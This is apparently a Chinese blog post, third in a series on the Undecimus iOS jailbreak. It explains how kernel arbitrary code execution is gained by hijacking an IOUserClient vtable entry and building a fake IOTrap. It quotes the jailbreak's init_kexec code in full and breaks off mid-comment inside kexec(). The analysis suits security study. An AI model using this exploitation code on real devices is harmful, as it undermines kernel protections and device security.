<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Undecimus 分析（三）通过 IOTrap 实现内核任意代码执行"><meta name="keywords" content="JailBreak,Undecimus,KEXEC,JOP"><meta name="author" content="高级页面仔 (Soulghost)"><meta name="copyright" content="高级页面仔 (Soulghost)"><title>Undecimus 分析（三）通过 IOTrap 实现内核任意代码执行 | iOS Security Cabin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#系列文章"><span class="toc-number">1.</span> <span class="toc-text">系列文章</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">2.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#kexec-概述"><span class="toc-number">3.</span> <span class="toc-text">kexec 概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#找到可劫持的函数指针"><span class="toc-number">3.1.</span> <span class="toc-text">找到可劫持的函数指针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实现函数劫持"><span class="toc-number">3.2.</span> <span class="toc-text">实现函数劫持</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#kexec-代码实现"><span class="toc-number">4.</span> <span class="toc-text">kexec 代码实现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PAC-带来的挑战"><span class="toc-number">4.1.</span> <span class="toc-text">PAC 带来的挑战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#虚函数劫持"><span class="toc-number">4.2.</span> <span class="toc-text">虚函数劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#构造-IOTrap"><span class="toc-number">4.3.</span> <span class="toc-text">构造 IOTrap</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#kexec-实验"><span class="toc-number">5.</span> <span class="toc-text">kexec 实验</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境准备"><span class="toc-number">5.1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取一个内核函数的地址"><span class="toc-number">5.2.</span> <span class="toc-text">获取一个内核函数的地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调用内核函数"><span class="toc-number">5.3.</span> <span class="toc-text">调用内核函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">7.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://avatars0.githubusercontent.com/u/6300263?s=460&amp;u=c55866a279854c9150528b358802a75be5e6a507&amp;v=4"></div><div class="author-info__name text-center">高级页面仔 (Soulghost)</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">8</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">15</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">iOS Security Cabin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Undecimus 分析（三）通过 IOTrap 实现内核任意代码执行</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-01-12</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h1><ol>
<li><a href="https://juejin.im/post/5dd10660e51d453fac0a598d" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying</a></li>
<li><a href="https://juejin.im/post/5dd918d051882573180a2ba7" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address</a></li>
<li><a href="https://juejin.im/post/5de37a236fb9a071b5615dea" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（三）IOSurface Heap Spraying</a></li>
<li><a href="https://juejin.im/post/5dec7f2f6fb9a0160c411516" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（四）The tfp0 !</a></li>
<li><a href="https://juejin.im/post/5df5f6416fb9a016402d1cc0" target="_blank" rel="noopener">iOS Jailbreak Principles - Undecimus 分析（一）Escape from Sandbox</a></li>
<li><a href="https://juejin.im/post/5e087dbd51882549757e5be2" target="_blank" rel="noopener">iOS Jailbreak Principles - Undecimus 分析（二）通过 String XREF 定位内核数据</a></li>
</ol>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 <a href="https://juejin.im/post/5e087dbd51882549757e5be2" target="_blank" rel="noopener">上一篇文章</a> 中我们介绍了基于 String 的交叉引用定位内核数据的方法，基于此我们可以定位变量和函数地址。本文将介绍结合tfp0、String XREF 定位和 IOTrap 实现内核任意代码执行的过程。一旦达成这个 Primitive，我们就能以 root 权限执行内核函数，从而更好的控制内核。</p>
<h1 id="kexec-概述"><a href="#kexec-概述" class="headerlink" title="kexec 概述"></a>kexec 概述</h1><p>在 Undecimus 中，内核任意代码执行是通过 ROP Gadget 实现的。具体方法是劫持一个系统的函数指针，将其指向想要调用的函数，再按照被劫持处的函数指针原型准备参数，最后设法触发系统对被劫持指针的调用。</p>
<h2 id="找到可劫持的函数指针"><a href="#找到可劫持的函数指针" class="headerlink" title="找到可劫持的函数指针"></a>找到可劫持的函数指针</h2><p>要实现上述 ROP，一个关键是找到一个可在 Userland 触发、易劫持的函数指针调用，另一个关键是该函数指针的原型最好支持可变参数个数，否则会对参数准备带来麻烦。所幸在 IOKit 中系统提供了 IOTrap 机制正好满足上述所有条件。</p>
<p>IOKit 为 userland 提供了 IOConnectTrapX 函数来触发注册到 IOUserClient 的 IOTrap，其中 X 代表的是参数个数，最大支持 6 个入参：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">IOConnectTrap6(<span class="keyword">io_connect_t</span>	<span class="built_in">connect</span>,</span><br><span class="line">	       <span class="keyword">uint32_t</span>		index,</span><br><span class="line">	       <span class="keyword">uintptr_t</span>	p1,</span><br><span class="line">	       <span class="keyword">uintptr_t</span>	p2,</span><br><span class="line">	       <span class="keyword">uintptr_t</span>	p3,</span><br><span class="line">	       <span class="keyword">uintptr_t</span>	p4,</span><br><span class="line">	       <span class="keyword">uintptr_t</span>	p5,</span><br><span class="line">	       <span class="keyword">uintptr_t</span>	p6 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> iokit_user_client_trap(<span class="built_in">connect</span>, index, p1, p2, p3, p4, p5, p6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>userland 的调用在内核中对应 <code>iokit_user_client_trap</code> 函数，具体实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">iokit_user_client_trap</span><span class="params">(struct iokit_user_client_trap_args *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">kern_return_t</span> result = kIOReturnBadArgument;</span><br><span class="line">    IOUserClient *userClient;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((userClient = OSDynamicCast(IOUserClient,</span><br><span class="line">            iokit_lookup_connect_ref_current_task((<span class="keyword">mach_port_name_t</span>)(<span class="keyword">uintptr_t</span>)args-&gt;userClientRef)))) &#123;</span><br><span class="line">        IOExternalTrap *trap;</span><br><span class="line">        IOService *target = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// find a trap</span></span><br><span class="line">        trap = userClient-&gt;getTargetAndTrapForIndex(&amp;target, args-&gt;index);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (trap &amp;&amp; target) &#123;</span><br><span class="line">            IOTrap func;</span><br><span class="line"></span><br><span class="line">            func = trap-&gt;func;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (func) &#123;</span><br><span class="line">                result = (target-&gt;*func)(args-&gt;p1, args-&gt;p2, args-&gt;p3, args-&gt;p4, args-&gt;p5, args-&gt;p6);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">	iokit_remove_connect_reference(userClient);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码先将从 userland 传入的 IOUserClient 句柄转换为内核对象，随后从 userClient 上取出 IOTrap 执行对应的函数指针。因此只要劫持 <code>getTargetAndTrapForIndex</code> 并返回刻意构造的 IOTrap，即可篡改内核执行的 <code>target-&gt;*func</code>；更为完美的是，函数的入参恰好是 userland 调用 IOConnectTrapX 的入参。</p>
<p>下面我们看一下 <code>getTargetAndTrapForIndex</code> 的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IOExternalTrap * IOUserClient::</span><br><span class="line">getTargetAndTrapForIndex(IOService ** targetP, UInt32 index)</span><br><span class="line">&#123;</span><br><span class="line">    IOExternalTrap *trap = getExternalTrapForIndex(index);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (trap) &#123;</span><br><span class="line">        *targetP = trap-&gt;object;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> trap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见 IOTrap 是从 <code>getExternalTrapForIndex</code> 方法返回的，继续跟进发现这是一个默认实现为空的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IOExternalTrap * IOUserClient::</span><br><span class="line">getExternalTrapForIndex(UInt32 index)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见此函数在父类上默认不实现，大概率是一个虚函数，下面看一下 IOUserClient 的 class 的声明来验证：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IOUserClient</span> :</span> <span class="keyword">public</span> IOService &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// Methods for accessing trap vector - old and new style</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> IOExternalTrap * <span class="title">getExternalTrapForIndex</span><span class="params">( UInt32 index )</span> APPLE_KEXT_DEPRECATED</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>既然是虚函数，我们可以结合 tfp0 修改 userClient 对象的虚函数表，篡改 <code>getExternalTrapForIndex</code> 的虚函数指针指向我们的 ROP Gadget，并在这里构造好 IOTrap 返回。</p>
<h2 id="实现函数劫持"><a href="#实现函数劫持" class="headerlink" title="实现函数劫持"></a>实现函数劫持</h2><p>在 Undecimus 的源码中，<code>getExternalTrapForIndex</code> 的虚函数指针被指向了一个内核中已存在的指令区域：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add </span>x0, x0, <span class="number">#0x40</span></span><br><span class="line"><span class="symbol">ret</span></span><br></pre></td></tr></table></figure>

<p>这里没有手动构造指令，应该是考虑到构造一个可执行的页成本较高，而复用一个已有的指令区域则非常简单。下面我们分析一下这两条指令的作用。</p>
<p>因为 <code>getExternalTrapForIndex</code> 是一个实例方法，它的 x0 是隐含参数 this，所以被劫持 <code>getExternalTrapForIndex</code> 的返回值为 this + 0x40，即我们要在 userClient + 0x40 处存储一个刻意构造的 IOTrap 结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IOExternalTrap</span> &#123;</span></span><br><span class="line">    IOService *		object;</span><br><span class="line">    IOTrap		func;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>再回忆下 IOTrap 的执行过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">trap = userClient-&gt;getTargetAndTrapForIndex(&amp;target, args-&gt;index);</span><br><span class="line"><span class="keyword">if</span> (trap &amp;&amp; target) &#123;</span><br><span class="line">    IOTrap func;</span><br><span class="line"></span><br><span class="line">    func = trap-&gt;func;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (func) &#123;</span><br><span class="line">        result = (target-&gt;*func)(args-&gt;p1, args-&gt;p2, args-&gt;p3, args-&gt;p4, args-&gt;p5, args-&gt;p6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的 target 即 IOTrap 的 object 对象，它作为函数调用的隐含入参 this；而 func 即为被调用的函数指针。到这里一切都明朗了起来：</p>
<ol>
<li>将要执行的符号地址写入 trap-&gt;func 即可执行任意函数；</li>
<li>将函数的第 0 个参数放置到 trap-&gt;object，第 1 ~ 6 个参数在调用 IOConnectTrap6 时传入，即可实现可变入参传递。</li>
</ol>
<h1 id="kexec-代码实现"><a href="#kexec-代码实现" class="headerlink" title="kexec 代码实现"></a>kexec 代码实现</h1><p>上述讨论较为宏观，忽略了一些重要细节，下面将结合 Undecimus 源码进行详细分析。</p>
<h2 id="PAC-带来的挑战"><a href="#PAC-带来的挑战" class="headerlink" title="PAC 带来的挑战"></a>PAC 带来的挑战</h2><p>自 iPhone XS 开始，苹果在 ARM 处理器中扩展了一项称之为 PAC(Pointer Authentication Code) 的技术，它将指针和返回地址使用特定的密钥寄存器签名，并在使用时验签。一旦验签失败，将会解出一个无效地址引发 Crash，它为各种常见的寻址指令增加了扩展指令[1]：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BLR -&gt; BLRA*</span><br><span class="line">LDRA -&gt; LDRA*</span><br><span class="line">RET -&gt; RETA*</span><br></pre></td></tr></table></figure>
<p>这项技术给我们的 ROP 带来了很大麻烦，在 Undecimus 中针对 PAC 做了一系列特殊处理，<strong>整个过程十分复杂，本文不再展开，将在接下来的文章中详细介绍 PAC 缓解措施及其绕过方式</strong>。有兴趣的读者可以阅读 <a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html#" target="_blank" rel="noopener">Examining Pointer Authentication on the iPhone XS</a> 来详细了解。</p>
<h2 id="虚函数劫持"><a href="#虚函数劫持" class="headerlink" title="虚函数劫持"></a>虚函数劫持</h2><p>我们知道 C++ 对象的虚函数表指针位于对象的起始地址，而虚函数表中按照偏移存放着实例方法的函数指针[2]，因此我们只要确定了 <code>getExternalTrapForIndex</code> 方法的偏移量，再利用 tfp0 篡改虚函数指向的地址即可实现 ROP。</p>
<p>Undecimus 的相关源码位于 init_kexec 中，我们先忽略 arm64e 对 PAC 的处理，了解它的 vtable patch 方法，下面的代码包含了 9 个关键步骤，已给出关键注释：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">init_kexec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __arm64e__</span></span><br><span class="line">    <span class="keyword">if</span> (!parameters_init()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    kernel_task_port = tfp0;</span><br><span class="line">    <span class="keyword">if</span> (!MACH_PORT_VALID(kernel_task_port)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    current_task = ReadKernel64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));</span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(current_task)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    kernel_task = ReadKernel64(getoffset(kernel_task));</span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(kernel_task)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!kernel_call_init()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 创建一个 IOUserClient</span></span><br><span class="line">    user_client = prepare_user_client();</span><br><span class="line">    <span class="keyword">if</span> (!MACH_PORT_VALID(user_client)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable</span></span><br><span class="line">    <span class="comment">// 2. 获取 IOUserClient 的内核地址，它是一个 ipc_port</span></span><br><span class="line">    IOSurfaceRootUserClient_port = get_address_of_port(proc_struct_addr(), user_client); <span class="comment">// UserClients are just mach_ports, so we find its address</span></span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(IOSurfaceRootUserClient_port)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 从 ipc_port-&gt;kobject 获取 IOUserClient 对象</span></span><br><span class="line">    IOSurfaceRootUserClient_addr = ReadKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); <span class="comment">// The UserClient itself (the C++ object) is at the kobject field</span></span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(IOSurfaceRootUserClient_addr)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 虚函数指针位于 C++ 对象的起始地址</span></span><br><span class="line">    <span class="keyword">kptr_t</span> IOSurfaceRootUserClient_vtab = ReadKernel64(IOSurfaceRootUserClient_addr); <span class="comment">// vtables in C++ are at *object</span></span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(IOSurfaceRootUserClient_vtab)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one</span></span><br><span class="line">    <span class="comment">// Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the vtable in the kernel memory, then copy the existing vtable into there</span></span><br><span class="line">    <span class="comment">// 5. 构造和拷贝虚函数表</span></span><br><span class="line">    fake_vtable = kmem_alloc(fake_kalloc_size);</span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(fake_vtable)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">        WriteKernel64(fake_vtable + i * <span class="number">8</span>, ReadKernel64(IOSurfaceRootUserClient_vtab + i * <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the fake user client</span></span><br><span class="line">    <span class="comment">// 6. 构造一个 IOUserClient 对象，并拷贝内核中 IOUserClient 的内容到构造的对象</span></span><br><span class="line">    fake_client = kmem_alloc(fake_kalloc_size);</span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(fake_client)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">        WriteKernel64(fake_client + i * <span class="number">8</span>, ReadKernel64(IOSurfaceRootUserClient_addr + i * <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write our fake vtable into the fake user client</span></span><br><span class="line">    <span class="comment">// 7. 将构造的虚函数表写入构造的 IOUserClient 对象</span></span><br><span class="line">    WriteKernel64(fake_client, fake_vtable);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replace the user client with ours</span></span><br><span class="line">    <span class="comment">// 8. 将构造的 IOUserClient 对象写回 IOUserClient 对应的 ipc_port</span></span><br><span class="line">    WriteKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now the userclient port we have will look into our fake user client rather than the old one</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)</span></span><br><span class="line">    <span class="comment">// 9. 将特定指令区域的地址写入到虚函数表的第 183 个 Entity</span></span><br><span class="line">    <span class="comment">// 它对应的是 getExternalTrapForIndex 的地址</span></span><br><span class="line">    WriteKernel64(fake_vtable + <span class="number">8</span> * <span class="number">0xB7</span>, getoffset(add_x0_x0_0x40_ret));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    pthread_mutex_init(&amp;kexec_lock, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时我们已经修改了构造的 userClient 的 <code>getExternalTrapForIndex</code> 逻辑，接下来只需要对 userClient 调用 IOConnectTrap6 即可实现 ROP 攻击，剩下的一个关键步骤是准备 IOTrap 作为 ROP Gadget 的返回值。</p>
<h2 id="构造-IOTrap"><a href="#构造-IOTrap" class="headerlink" title="构造 IOTrap"></a>构造 IOTrap</h2><p>由于 <code>getExternalTrapForIndex</code> 被指向了如下指令：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add </span>x0, x0, <span class="number">#0x40</span></span><br><span class="line"><span class="symbol">ret</span></span><br></pre></td></tr></table></figure>

<p>我们需要在 userClient + 0x40 处构造一个 IOTrap：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IOExternalTrap</span> &#123;</span></span><br><span class="line">    IOService *		object;</span><br><span class="line">    IOTrap		func;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>根据前面的讨论，object 应当被赋予被调用函数的第 0 个参数地址，func 应当赋予被调用函数的地址，然后再将函数的第 1 ~ 6 个参数通过 IOConnectTrap 的 args 传入。下面我们来看 Undecimus 中 kexec 的具体实现，笔者在其中补充了一些注释：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kptr_t</span> <span class="title">kexec</span><span class="params">(<span class="keyword">kptr_t</span> ptr, <span class="keyword">kptr_t</span> x0, <span class="keyword">kptr_t</span> x1, <span class="keyword">kptr_t</span> x2, <span class="keyword">kptr_t</span> x3, <span class="keyword">kptr_t</span> x4, <span class="keyword">kptr_t</span> x5, <span class="keyword">kptr_t</span> x6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">kptr_t</span> returnval = <span class="number">0</span>;</span><br><span class="line">    pthread_mutex_lock(&amp;kexec_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __arm64e__</span></span><br><span class="line">    returnval = kernel_call_7(ptr, <span class="number">7</span>, x0, x1, x2, x3, x4, x5, x6);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">// When calling 